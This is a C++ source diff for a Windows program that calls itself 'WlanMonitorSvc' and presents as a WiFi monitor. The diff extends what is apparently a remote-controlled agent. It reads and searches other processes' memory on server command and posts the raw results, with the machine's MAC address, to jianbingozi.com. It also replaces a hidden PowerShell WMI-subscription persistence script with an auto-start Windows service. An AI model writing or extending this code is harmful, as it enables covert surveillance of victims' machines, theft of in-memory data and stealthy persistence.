@@ -24,6 +24,7 @@
 #include <atomic>
 #include <algorithm>
 #include <cctype>
+#include <cstring>
 #include <cstdlib>
 #include <ctime>
 #include <sstream>
@@ -49,7 +50,7 @@
 
 // ==============================================================
 // 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
-#define MANUAL_COMPILE_VERSION "1.9.4"
+#define MANUAL_COMPILE_VERSION "1.9.9"
 #define MANUAL_BUILD_CHANNEL "stable"
 // ==============================================================
 
@@ -547,7 +548,9 @@ std::string GetMemoryProcessListNative() {
     return res;
 }
 
-std::string GetMemoryMapNative(DWORD pid) {
+bool IsReadableMemoryProtect(DWORD protect);
+
+std::string GetMemoryMapNative(DWORD pid, bool readableOnly = false) {
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
     if (!hProcess) {
         return "{\"error\":\"OpenProcess failed: " + std::to_string(GetLastError()) + "\"}";
@@ -558,29 +561,31 @@ std::string GetMemoryMapNative(DWORD pid) {
     ULONG_PTR addr = (ULONG_PTR)si.lpMinimumApplicationAddress;
     ULONG_PTR maxAddr = (ULONG_PTR)si.lpMaximumApplicationAddress;
     std::string res = "[";
+    res.reserve(readableOnly ? 64 * 1024 : 512 * 1024);
     bool first = true;
-    int count = 0;
-    while (addr < maxAddr && count < 4096) {
+    while (addr < maxAddr) {
         MEMORY_BASIC_INFORMATION mbi;
         SIZE_T got = VirtualQueryEx(hProcess, (LPCVOID)addr, &mbi, sizeof(mbi));
         if (got == 0) break;
 
-        if (!first) res += ",";
-        first = false;
         ULONG_PTR base = (ULONG_PTR)mbi.BaseAddress;
         ULONG_PTR allocBase = (ULONG_PTR)mbi.AllocationBase;
         ULONGLONG size = (ULONGLONG)mbi.RegionSize;
-        res += "{\"Base\":\"" + HexPtrString(base) + "\"" +
-               ",\"AllocationBase\":\"" + HexPtrString(allocBase) + "\"" +
-               ",\"Size\":" + std::to_string(size) +
-               ",\"State\":\"" + StateToString(mbi.State) + "\"" +
-               ",\"Protect\":\"" + ProtectToString(mbi.Protect) + "\"" +
-               ",\"Type\":\"" + TypeToString(mbi.Type) + "\"}";
+        bool includeRegion = !readableOnly || (mbi.State == MEM_COMMIT && IsReadableMemoryProtect(mbi.Protect));
+        if (includeRegion) {
+            if (!first) res += ",";
+            first = false;
+            res += "{\"Base\":\"" + HexPtrString(base) + "\"" +
+                   ",\"AllocationBase\":\"" + HexPtrString(allocBase) + "\"" +
+                   ",\"Size\":" + std::to_string(size) +
+                   ",\"State\":\"" + StateToString(mbi.State) + "\"" +
+                   ",\"Protect\":\"" + ProtectToString(mbi.Protect) + "\"" +
+                   ",\"Type\":\"" + TypeToString(mbi.Type) + "\"}";
+        }
 
         ULONG_PTR next = base + (ULONG_PTR)mbi.RegionSize;
         if (next <= addr) break;
         addr = next;
-        ++count;
     }
     CloseHandle(hProcess);
     res += "]";
@@ -667,6 +672,57 @@ std::vector<BYTE> BuildSearchPattern(const std::string& mode, const std::string&
     return pattern;
 }
 
+const SIZE_T kMemorySearchChunkSize = 8 * 1024 * 1024;
+const int kMemorySearchMaxResults = 200;
+
+std::vector<SIZE_T> FindPatternPositions(const BYTE* data, SIZE_T dataSize, const std::vector<BYTE>& pattern, SIZE_T searchLimit, int maxPositions) {
+    std::vector<SIZE_T> positions;
+    if (maxPositions <= 0) return positions;
+    const SIZE_T patternSize = pattern.size();
+    if (patternSize == 0 || dataSize < patternSize || searchLimit == 0) return positions;
+    positions.reserve((SIZE_T)min(maxPositions, 64));
+    searchLimit = min(searchLimit, dataSize - patternSize + 1);
+
+    if (patternSize == 1) {
+        const BYTE needle = pattern[0];
+        const BYTE* current = data;
+        const BYTE* end = data + searchLimit;
+        while (current < end) {
+            const void* found = memchr(current, needle, (SIZE_T)(end - current));
+            if (!found) break;
+            const BYTE* foundByte = static_cast<const BYTE*>(found);
+            positions.push_back((SIZE_T)(foundByte - data));
+            if ((int)positions.size() >= maxPositions) break;
+            current = foundByte + 1;
+        }
+        return positions;
+    }
+
+    SIZE_T skip[256];
+    for (SIZE_T i = 0; i < 256; ++i) skip[i] = patternSize;
+    for (SIZE_T i = 0; i + 1 < patternSize; ++i) {
+        skip[pattern[i]] = patternSize - 1 - i;
+    }
+
+    SIZE_T pos = 0;
+    while (pos < searchLimit) {
+        SIZE_T idx = patternSize - 1;
+        while (data[pos + idx] == pattern[idx]) {
+            if (idx == 0) {
+                positions.push_back(pos);
+                if ((int)positions.size() >= maxPositions) return positions;
+                ++pos;
+                goto next_position;
+            }
+            --idx;
+        }
+        pos += skip[data[pos + patternSize - 1]];
+next_position:
+        continue;
+    }
+    return positions;
+}
+
 std::string SearchMemoryNative(DWORD pid, const std::string& mode, const std::string& query) {
     std::vector<BYTE> pattern = BuildSearchPattern(mode, query);
     if (pattern.empty()) {
@@ -685,13 +741,15 @@ std::string SearchMemoryNative(DWORD pid, const std::string& mode, const std::st
     GetSystemInfo(&si);
     ULONG_PTR addr = (ULONG_PTR)si.lpMinimumApplicationAddress;
     ULONG_PTR maxAddr = (ULONG_PTR)si.lpMaximumApplicationAddress;
-    const SIZE_T chunkSize = 512 * 1024;
-    const int maxResults = 200;
+    const SIZE_T chunkSize = kMemorySearchChunkSize;
+    const int maxResults = kMemorySearchMaxResults;
     ULONGLONG scanned = 0;
     int regionCount = 0;
     int resultCount = 0;
     bool truncated = false;
     std::string results = "[";
+    results.reserve(64 * 1024);
+    std::vector<BYTE> buffer(chunkSize + pattern.size() - 1);
 
     while (addr < maxAddr && regionCount < 8192 && resultCount < maxResults) {
         MEMORY_BASIC_INFORMATION mbi;
@@ -705,15 +763,13 @@ std::string SearchMemoryNative(DWORD pid, const std::string& mode, const std::st
             while (offset < regionSize && resultCount < maxResults) {
                 SIZE_T remaining = regionSize - offset;
                 SIZE_T toRead = min(chunkSize + pattern.size() - 1, remaining);
-                std::vector<BYTE> buffer(toRead);
                 SIZE_T bytesRead = 0;
                 if (ReadProcessMemory(hProcess, (LPCVOID)(base + offset), buffer.data(), toRead, &bytesRead) && bytesRead >= pattern.size()) {
                     scanned += bytesRead;
-                    auto searchStart = buffer.begin();
-                    while (resultCount < maxResults) {
-                        auto it = std::search(searchStart, buffer.begin() + bytesRead, pattern.begin(), pattern.end());
-                        if (it == buffer.begin() + bytesRead) break;
-                        SIZE_T pos = (SIZE_T)std::distance(buffer.begin(), it);
+                    SIZE_T searchLimit = min(chunkSize, bytesRead);
+                    std::vector<SIZE_T> positions = FindPatternPositions(buffer.data(), bytesRead, pattern, searchLimit, maxResults - resultCount);
+                    for (SIZE_T pos : positions) {
+                        if (resultCount >= maxResults) break;
                         ULONG_PTR foundAddr = base + offset + pos;
                         SIZE_T previewLen = min((SIZE_T)64, bytesRead - pos);
                         if (resultCount > 0) results += ",";
@@ -723,7 +779,6 @@ std::string SearchMemoryNative(DWORD pid, const std::string& mode, const std::st
                                    ",\"Type\":\"" + TypeToString(mbi.Type) + "\"" +
                                    ",\"Preview\":\"" + EscapeJsonString(BytesToAsciiPreview(buffer.data() + pos, previewLen)) + "\"}";
                         ++resultCount;
-                        searchStart = it + 1;
                     }
                 }
                 if (remaining <= chunkSize) break;
@@ -1398,28 +1453,72 @@ typedef struct _SERVICE_FAILURE_ACTIONS_FLAG {
 } SERVICE_FAILURE_ACTIONS_FLAG, *LPSERVICE_FAILURE_ACTIONS_FLAG;
 #endif
 
-// 注册 WMI 订阅实现开机自启；保持 WMI 方案，不切换为 Windows Service。
-void InstallWMIAutoStart() {
+// 注册为 Windows 服务以实现开机自启（替换原来的 WMI 自启方案）
+void InstallWindowsService() {
     std::string exePath = GetExePath();
-    WriteLog("正在注册 WMI 订阅自启，触发时间为开机5s...");
+    WriteLog("正在注册为 Windows 服务并设置为自动启动...");
 
-    std::string psCmd = 
-        "powershell.exe -WindowStyle Hidden -NonInteractive -NoProfile -Command \""
-        "$NS='root\\subscription';"
-        "$N='WlanMonitorSvc_WMI';"
-        "$b=Get-WmiObject -Namespace $NS -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match $N }; if($b){$b|Remove-WmiObject};"
-        "$c=Get-WmiObject -Namespace $NS -Class CommandLineEventConsumer -Filter \\\"Name='$N'\\\"; if($c){$c|Remove-WmiObject};"
-        "$f=Get-WmiObject -Namespace $NS -Class __EventFilter -Filter \\\"Name='$N'\\\"; if($f){$f|Remove-WmiObject};"
-        "$Q='SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 5 AND PreviousInstance.SystemUpTime < 5';"
-        "$FI=Set-WmiInstance -Namespace $NS -Class __EventFilter -Arguments @{Name=$N;EventNamespace='root\\cimv2';QueryLanguage='WQL';Query=$Q};"
-        "$Path='" + exePath + "';"
-        "$cmdL=[char]34+$Path+[char]34;"
-        "$CI=Set-WmiInstance -Namespace $NS -Class CommandLineEventConsumer -Arguments @{Name=$N;CommandLineTemplate=$cmdL};"
-        "Set-WmiInstance -Namespace $NS -Class __FilterToConsumerBinding -Arguments @{Filter=$FI;Consumer=$CI};"
-        "\"";
-    ExecCmd(psCmd);
-    WriteLog("成功：WMI 自启注册完毕");
+    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
+    if (!hSCM) {
+        WriteLog(std::string("OpenSCManagerA failed, error=") + std::to_string(GetLastError()));
+        return;
+    }
 
+    // 尝试创建服务
+    SC_HANDLE hService = CreateServiceA(
+        hSCM,
+        "WlanMonitorSvc",
+        "WlanMonitorSvc",
+        SERVICE_ALL_ACCESS,
+        SERVICE_WIN32_OWN_PROCESS,
+        SERVICE_AUTO_START,
+        SERVICE_ERROR_NORMAL,
+        exePath.c_str(),
+        NULL,
+        NULL,
+        NULL,
+        NULL,
+        NULL);
+
+    if (!hService) {
+        DWORD err = GetLastError();
+        if (err == ERROR_SERVICE_EXISTS) {
+            WriteLog("服务已存在，尝试更新启动类型并启动服务...");
+            hService = OpenServiceA(hSCM, "WlanMonitorSvc", SERVICE_CHANGE_CONFIG | SERVICE_START | SERVICE_QUERY_STATUS);
+            if (hService) {
+                if (!ChangeServiceConfigA(hService, SERVICE_NO_CHANGE, SERVICE_AUTO_START, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
+                    WriteLog(std::string("ChangeServiceConfigA failed, error=") + std::to_string(GetLastError()));
+                }
+            } else {
+                WriteLog(std::string("OpenServiceA failed, error=") + std::to_string(GetLastError()));
+                CloseServiceHandle(hSCM);
+                return;
+            }
+        } else {
+            WriteLog(std::string("CreateServiceA failed, error=") + std::to_string(err));
+            CloseServiceHandle(hSCM);
+            return;
+        }
+    } else {
+        WriteLog("服务创建成功。");
+    }
+
+    // 尝试启动服务
+    if (hService) {
+        if (!StartServiceA(hService, 0, NULL)) {
+            DWORD err = GetLastError();
+            if (err == ERROR_SERVICE_ALREADY_RUNNING) {
+                WriteLog("服务已在运行。");
+            } else {
+                WriteLog(std::string("StartServiceA 失败, error=") + std::to_string(err));
+            }
+        } else {
+            WriteLog("服务已启动。");
+        }
+        CloseServiceHandle(hService);
+    }
+
+    CloseServiceHandle(hSCM);
 }
 
 // UTF-8 转 ANSI 解决日志中文WiFi名乱码的问题
@@ -2173,6 +2272,31 @@ std::string EncHeartbeatParam(const std::string& value) {
     return UrlEncode(EncryptString(value));
 }
 
+bool PostRawFileResultToServer(const std::string& mac, const std::string& type, const std::string& output) {
+    HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hSession) return false;
+
+    bool sent = false;
+    HINTERNET hConnect = InternetConnectA(hSession, "jianbingozi.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
+    if (hConnect) {
+        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/file_result_raw", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 1);
+        if (hRequest) {
+            std::string headers = "Content-Type: text/plain; charset=utf-8\r\n";
+            headers += "X-Mac: " + mac + "\r\n";
+            headers += "X-Type: " + type + "\r\n";
+            if (HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)output.data(), (DWORD)output.size())) {
+                DWORD statusCode = 0;
+                DWORD statusLen = sizeof(statusCode);
+                sent = HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusLen, NULL) && statusCode == 200;
+            }
+            InternetCloseHandle(hRequest);
+        }
+        InternetCloseHandle(hConnect);
+    }
+    InternetCloseHandle(hSession);
+    return sent;
+}
+
 // 向服务器报备上线
 void ReportToServer() {
     std::string mac = GetMacAddress();
@@ -2417,10 +2541,13 @@ void ReportToServer() {
                     } else if (type == "MEM_PROC") {
                         res = GetMemoryProcessListNative();
                     } else if (type == "MEM_MAP") {
+                        size_t pipePos = argStr.find('|');
+                        std::string pidText = (pipePos == std::string::npos) ? argStr : argStr.substr(0, pipePos);
+                        std::string mapMode = (pipePos == std::string::npos) ? "readable" : argStr.substr(pipePos + 1);
                         DWORD pid = 0;
-                        try { pid = (DWORD)std::stoul(argStr); } catch(...) {}
+                        try { pid = (DWORD)std::stoul(pidText); } catch(...) {}
                         if (pid == 0) res = "{\"error\":\"Invalid PID\"}";
-                        else res = GetMemoryMapNative(pid);
+                        else res = GetMemoryMapNative(pid, mapMode != "all");
                     } else if (type == "MEM_READ") {
                         size_t p1 = argStr.find('|');
                         size_t p2 = (p1 == std::string::npos) ? std::string::npos : argStr.find('|', p1 + 1);
@@ -2588,20 +2715,26 @@ void ReportToServer() {
                         }
                     }
 
-                    std::string postData = "mac=" + UrlEncode(mac) + "&type=" + UrlEncode(type) + "&output=" + UrlEncode(res);
-                    HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-                    if (hSession) {
-                        HINTERNET hConnect = InternetConnectA(hSession, "jianbingozi.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
-                        if (hConnect) {
-                            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/file_result", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 1);
-                            if (hRequest) {
-                                std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
-                                HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)postData.c_str(), (DWORD)postData.length());
-                                InternetCloseHandle(hRequest);
+                    bool resultSent = false;
+                    if (type.rfind("MEM_", 0) == 0) {
+                        resultSent = PostRawFileResultToServer(mac, type, res);
+                    }
+                    if (!resultSent) {
+                        std::string postData = "mac=" + UrlEncode(mac) + "&type=" + UrlEncode(type) + "&output=" + UrlEncode(res);
+                        HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+                        if (hSession) {
+                            HINTERNET hConnect = InternetConnectA(hSession, "jianbingozi.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
+                            if (hConnect) {
+                                HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/file_result", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 1);
+                                if (hRequest) {
+                                    std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
+                                    HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)postData.c_str(), (DWORD)postData.length());
+                                    InternetCloseHandle(hRequest);
+                                }
+                                InternetCloseHandle(hConnect);
                             }
-                            InternetCloseHandle(hConnect);
+                            InternetCloseHandle(hSession);
                         }
-                        InternetCloseHandle(hSession);
                     }
 
                     // 用户操作执行完毕，上报一次日志使云端可以即时查看最新状态
@@ -3773,10 +3906,10 @@ int main()
     // 直接在当前进程中循环监听，方便断点调试
     MonitorWiFiLoop();
 #else
-    WriteLog("========== 程序手动启动 (管理员进入 WMI 驻留模式) ==========");
+    WriteLog("========== 程序手动启动 (管理员进入 服务 安装/运行 模式) ==========");
 
-    // 安装 WMI 后台自启，保持 WMI 方案。
-    InstallWMIAutoStart();
+    // 安装为 Windows 服务并设置开机自动启动（替换原来的 WMI 方案）
+    InstallWindowsService();
 
     WriteLog("========== 准备完毕，进入后台常驻监听循环 ==========\n");
     MonitorWiFiLoop();
